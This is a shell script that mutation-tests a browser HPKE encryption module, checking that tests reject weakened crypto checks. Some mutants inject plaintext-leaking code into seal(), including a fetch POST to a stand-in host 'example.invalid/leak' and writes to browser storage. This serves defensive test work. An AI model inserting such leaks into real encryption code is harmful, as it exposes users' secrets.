#!/bin/sh
# Each mutant must fail the browser assertion, not just fail to start Chrome.
set -eu
root=$(cd "$(dirname "$0")/.." && pwd)
# Private per-run build cache: on a host shared by several clones a
# default $GOCACHE can serve one clone's half-written entries to another,
# giving spurious build failures. Respects an already-exported GOCACHE.
. "$root/scripts/lib/gocache.sh"
. "$root/scripts/mutation-helpers.sh"
. "$root/scripts/temp-workspace.sh"
temp_workspace
diagnose() {
 python3 "$root/scripts/intake_mutant_diagnostics.py" --hpke "$work/result" "$1" 2>/dev/null || :
}
mutate() {
 name=$1 from=$2 to=$3 expected=${4:-}
 mkdir -p "$work/tree/scripts/lib" "$work/tree/web/intake/testdata"
 cp "$root/scripts/check-intake-browser.mjs" "$work/tree/scripts/"
 # Every module the harness imports, so a new import cannot leave the mutant
 # dying with ERR_MODULE_NOT_FOUND before any browser assertion.
 cp "$root"/scripts/lib/*.mjs "$work/tree/scripts/lib/"
 cp "$root/web/intake/testdata/rfc9180-x25519-aes256.json" "$work/tree/web/intake/testdata/"
 # Match the complete small module so a two-line reorder is one mutation.
 INTAKE_MUTATION_FROM="$from" INTAKE_MUTATION_TO="$to" awk '
  BEGIN { from=ENVIRON["INTAKE_MUTATION_FROM"]; to=ENVIRON["INTAKE_MUTATION_TO"] }
  { source=source $0 ORS }
  END {
   rest=source; while ((i=index(rest,from))) { count++; rest=substr(rest,i+length(from)) }
   if(count!=1) exit 1
   i=index(source,from)
   printf "%s%s%s", substr(source,1,i-1), to, substr(source,i+length(from))
  }' "$root/web/intake/hpke.js" > "$work/tree/web/intake/hpke.js" || { echo "FAIL $name: mutation did not apply — the source changed, update this script"; exit 1; }
 # fixture-hash edits a fixture, not source: nothing to anchor in apply-only mode.
 if [ "$name" = fixture-hash ] && mutation_apply_only; then return; fi
 mutation_applied "$name" && return
 if [ "$name" = fixture-hash ]; then printf '\n' >> "$work/tree/web/intake/testdata/rfc9180-x25519-aes256.json"; fi
 if node "$work/tree/scripts/check-intake-browser.mjs" > "$work/result" 2>&1; then
  diagnose 0
  echo "FAIL $name: browser accepted a broken HPKE implementation"; exit 1
 else
  status=$?
 fi
 if [ "$status" != 1 ]; then diagnose "$status"; echo "FAIL $name: expected rc=1, got $status"; exit 1; fi
 if ! grep -q 'AssertionError' "$work/result" || ! grep -Eq 'ciphertext mismatch|encapsulation mismatch|sender rejected RFC vector|ephemeral freshness failed|production ephemeral override accepted|extractable ephemeral key|invalid browser request accepted|invalid browser recipient accepted|browser message limit ignored|last legal browser seal rejected|zero-DH sender guard missing|zero-DH reached KDF before rejection|browser (localStorage|sessionStorage|IndexedDB|location hash|document title|log|exception) side effect|browser network side effect|browser console side effect|RFC fixture hash mismatch' "$work/result"; then
  diagnose "$status"
  echo "FAIL $name: browser did not reach a behavioral assertion"; exit 1
 fi
 if [ -n "$expected" ] && ! grep -q "$expected" "$work/result"; then
  diagnose "$status"
  echo "FAIL $name: its own side-effect observer did not fire"; exit 1
 fi
 echo "ok   $name: browser assertion rejected mutant (rc=1)"
}
mutate zero-dh "if(dh.every(byte=>byte===0))" "if(false)"
mutate zero-dh-order "if(dh.every(byte=>byte===0)) throw new Error('invalid HPKE shared secret');
    eae=await extract(empty,'eae_prk',dh,kemSuite);" "eae=await extract(empty,'eae_prk',dh,kemSuite);
    if(dh.every(byte=>byte===0)) throw new Error('invalid HPKE shared secret');" "zero-DH reached KDF before rejection"
# The harness seals a fresh fake canary; encode the seal input before
# planting it in a surface. Only the violation class is ever reported.
mutate local-storage 'async seal(plaintext,aad=empty) {' 'async seal(plaintext,aad=empty) { localStorage.setItem("probe",btoa(String.fromCharCode(...plaintext)));' "browser localStorage side effect"
mutate session-storage 'async seal(plaintext,aad=empty) {' 'async seal(plaintext,aad=empty) { sessionStorage.probe=btoa(String.fromCharCode(...plaintext));' "browser sessionStorage side effect"
mutate local-storage-define-property 'async seal(plaintext,aad=empty) {' 'async seal(plaintext,aad=empty) { const encoded=btoa(String.fromCharCode(...plaintext)); Object.defineProperty(localStorage,"probe",{value:encoded,writable:true,enumerable:true,configurable:true}); if(localStorage.probe!==encoded) throw new Error("storage probe did not persist");' "browser localStorage side effect"
mutate local-storage-reflect-define-property 'async seal(plaintext,aad=empty) {' 'async seal(plaintext,aad=empty) { const encoded=btoa(String.fromCharCode(...plaintext)); Reflect.defineProperty(localStorage,"probe",{value:encoded,writable:true,enumerable:true,configurable:true}); if(localStorage.probe!==encoded) throw new Error("storage probe did not persist");' "browser localStorage side effect"
mutate session-storage-define-property 'async seal(plaintext,aad=empty) {' 'async seal(plaintext,aad=empty) { const encoded=btoa(String.fromCharCode(...plaintext)); Object.defineProperty(sessionStorage,"probe",{value:encoded,writable:true,enumerable:true,configurable:true}); if(sessionStorage.probe!==encoded) throw new Error("storage probe did not persist");' "browser sessionStorage side effect"
mutate session-storage-reflect-define-property 'async seal(plaintext,aad=empty) {' 'async seal(plaintext,aad=empty) { const encoded=btoa(String.fromCharCode(...plaintext)); Reflect.defineProperty(sessionStorage,"probe",{value:encoded,writable:true,enumerable:true,configurable:true}); if(sessionStorage.probe!==encoded) throw new Error("storage probe did not persist");' "browser sessionStorage side effect"
mutate indexed-db 'async seal(plaintext,aad=empty) {' 'async seal(plaintext,aad=empty) { indexedDB.open(btoa(String.fromCharCode(...plaintext)));' "browser IndexedDB side effect"
mutate location-hash 'async seal(plaintext,aad=empty) {' 'async seal(plaintext,aad=empty) { location.hash=btoa(String.fromCharCode(...plaintext));' "browser location hash side effect"
mutate document-title 'async seal(plaintext,aad=empty) {' 'async seal(plaintext,aad=empty) { document.title=btoa(String.fromCharCode(...plaintext));' "browser document title side effect"
mutate runtime-exception 'async seal(plaintext,aad=empty) {' 'async seal(plaintext,aad=empty) { setTimeout(()=>{throw new Error(btoa(String.fromCharCode(...plaintext)));},0);' "browser exception side effect"
mutate cdp-log 'async seal(plaintext,aad=empty) {' 'async seal(plaintext,aad=empty) { const script=document.createElement("script"); script.textContent="/*"+btoa(String.fromCharCode(...plaintext))+"*/"; document.head.append(script);' "browser log side effect"

mutate request-start-anchor "!/^[0-9a-f]" "!/[0-9a-f]"
mutate request-end-anchor '{12}$/.test' '{12}/.test'
mutate network-request 'async seal(plaintext,aad=empty) {' 'async seal(plaintext,aad=empty) { void fetch("/leak",{method:"POST",body:plaintext}).catch(()=>{});'
mutate external-request 'async seal(plaintext,aad=empty) {' 'async seal(plaintext,aad=empty) { void fetch("https://example.invalid/leak",{method:"POST",body:plaintext}).catch(()=>{});'
mutate console-output 'async seal(plaintext,aad=empty) {' 'async seal(plaintext,aad=empty) { console.log(btoa(String.fromCharCode(...plaintext)));'
mutate console-warning 'async seal(plaintext,aad=empty) {' 'async seal(plaintext,aad=empty) { console.warn(plaintext);'
mutate fixture-hash 'HPKE-v1' 'HPKE-v1'
mutate ephemeral-freshness "const pair=await crypto.subtle.generateKey" "const pair=globalThis.cachedEphemeralPair??=await crypto.subtle.generateKey"
mutate non-extractable "generateKey('X25519',false" "generateKey('X25519',true"
mutate recipient-size "recipient.length!==32" "false"
mutate request-format "typeof requestID!=='string' || !/" "false && typeof requestID!=='string' || false && !/"
mutate message-limit "sequence>=sequenceLimit" "false"
mutate premature-limit "sequence>=sequenceLimit" "sequence>=sequenceLimit-1n"
mutate suite "0,1,0,2" "0,1,0,1"
mutate label "HPKE-v1" "HPKE-v0"
mutate mode "new Uint8Array([0]),pskHash" "new Uint8Array([1]),pskHash"
mutate nonce "sequence++" "0n"
mutate context "concat(enc,recipient)" "concat(recipient,enc)"
rm -rf "$work/tree"
mkdir "$work/tree"
(cd "$root" && tar --exclude=.git --exclude=.gocache --exclude=.gomodcache -cf - .) | (cd "$work/tree" && tar -xf -)
# Exercise the actual browser job entrypoint against the production header.
python3 - "$work/tree/internal/api/intake.go" <<'PYHEADER'
import pathlib,sys
p=pathlib.Path(sys.argv[1]);s=p.read_text()
old='w.Header().Set("Cache-Control", "no-store")'
if s.count(old)!=1:raise SystemExit('FAIL no-store: mutation target is not unique')
p.write_text(s.replace(old,'w.Header().Del("Cache-Control")',1))
PYHEADER
if mutation_apply_only; then
 echo 'ok   no-store: applies'
else
if (cd "$work/tree" && sh scripts/check-intake-browser.sh > "$work/header-result" 2>&1); then
 echo 'FAIL no-store: browser job accepted cacheable input responses'; exit 1
fi
if ! grep -q -- '--- FAIL: TestInputLinkCacheHeaders' "$work/header-result" || ! grep -q 'input response allows caching' "$work/header-result"; then
 echo 'FAIL no-store: browser job did not reach its header assertion'; exit 1
fi
echo 'ok   no-store: browser job rejected cacheable production responses'
grep 'input response allows caching' "$work/header-result"
fi
cp "$root/internal/api/intake.go" "$work/tree/internal/api/intake.go"
cross_mutate() {
 name=$1 from=$2 to=$3
 awk -v from="$from" -v to="$to" '
  { n=0; rest=$0; while ((i=index(rest,from))) { n++; rest=substr(rest,i+length(from)) }; count+=n }
  (i=index($0,from)) {$0=substr($0,1,i-1) to substr($0,i+length(from))}
  {print}
  END {exit count!=1}' "$root/web/intake/hpke.js" > "$work/tree/web/intake/hpke.js" || { echo "FAIL $name: mutation did not apply — the source changed, update this script"; exit 1; }
 mutation_applied "$name" && return
 if (cd "$work/tree" && go test -tags intake_browser -count=1 -run '^TestIntakeBrowserInteroperatesWithGo$' ./internal/builtin > "$work/cross-result" 2>&1); then
  echo "FAIL $name: Go accepted a broken browser request binding"; exit 1
 fi
 if ! grep -q -- '--- FAIL: TestIntakeBrowserInteroperatesWithGo' "$work/cross-result" || ! grep -Eq 'Go could not open browser ciphertext|browser cross-encryption failed' "$work/cross-result"; then
  echo "FAIL $name: cross-test did not reach its decryption assertion"; exit 1
 fi
 echo "ok   $name: Go rejected the broken browser request binding"
}
cross_mutate cross-network 'async seal(plaintext,aad=empty) {' 'async seal(plaintext,aad=empty) { void fetch("/leak",{method:"POST",body:plaintext}).catch(()=>{});'
cross_mutate cross-console 'async seal(plaintext,aad=empty) {' 'async seal(plaintext,aad=empty) { console.log(plaintext);'
cross_mutate intake-info 'keep/intake/v1' 'keep/intake/v0'
cross_mutate intake-request "'+requestID" "'"
if ! mutation_apply_only; then
node "$root/scripts/check-intake-browser.mjs"
 (cd "$root" && go test -tags intake_browser -count=1 -run '^TestIntakeBrowserInteroperatesWithGo$' ./internal/builtin)
echo "ok   baseline: real browser implementation passed"
fi
